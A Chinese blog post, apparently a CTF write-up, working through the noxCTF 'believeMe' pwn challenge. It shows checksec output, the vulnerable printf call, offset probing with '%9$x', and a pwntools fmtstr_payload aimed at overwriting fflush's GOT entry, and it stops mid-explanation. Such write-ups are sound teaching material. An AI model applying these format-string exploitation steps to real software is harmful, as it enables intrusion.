---
layout: post
title:  "nox_CSAW部分pwn题解"
date:   2018-10-09 18:00:00
categories: WriteUp
tags: WriteUp PWN nox CSAW
---

* content
{:toc}

## 前言

暑假的时候遇到了一群一起学习安全的小伙伴，在他们的诱劝下，开始接触国外的CTF比赛，作为最菜的pwn选手就试着先打两场比赛试试水，结果发现国外比赛真有意思哎嘿。

本文首发于安恒网络空间安全讲武堂 http://url.cn/5Abhs


### NOXCTF

#### PWN—believeMe(378)

惯例先走一遍file+checksec检查
```bash
➜  believeMe file believeMe 
believeMe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=03d2b6bcc0a0fdbab80a9852cab1d201437e7e30, not stripped
➜  believeMe checksec believeMe 
[*] '/home/Ep3ius/pwn/process/noxCTF2018/believeMe/believeMe'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

再简单的运行下程序看看程序是什么样的结构

```bash
➜  believeMe ./believeMe 
Someone told me that pwning makes noxāle...
But......... how ???? 
aaaa
aaaa%  
➜  believeMe
```
然后ida简单分析下，我们可以很直接的看到在main函数里有一个格式化字符串漏洞

```c
.text:080487CC ; 10:   printf(s);
.text:080487CC                 sub     esp, 0Ch
.text:080487CF                 lea     eax, [ebp+s]
.text:080487D2                 push    eax             ; format
.text:080487D3                 call    _printf
```

这里我本来以为只是简单的利用格式化字符串去修改fflush_got所以我先测出来fmt的偏移量为9

```bash
➜  believeMe ./believeMe 
Someone told me that pwning makes noxāle...
But......... how ???? 
aaaa%9$x
aaaa61616161%                                                         
➜  believeMe 
```

然后构造payload=fmtstr_payload(9,{fflush_got:noxflag_addr})想直接getflag，然后实际上没那么简单。调试过后发现fmtstr_payload不全，len(payload)输出检查后发现长度超了，稍微查了下pwntools文档的fmtstr部分，发现它默认是以hhn也就是单字节的形式去构造payload，如果以双字节或四字节的形式要加上write_size参数，这样payload的长度就不会超过40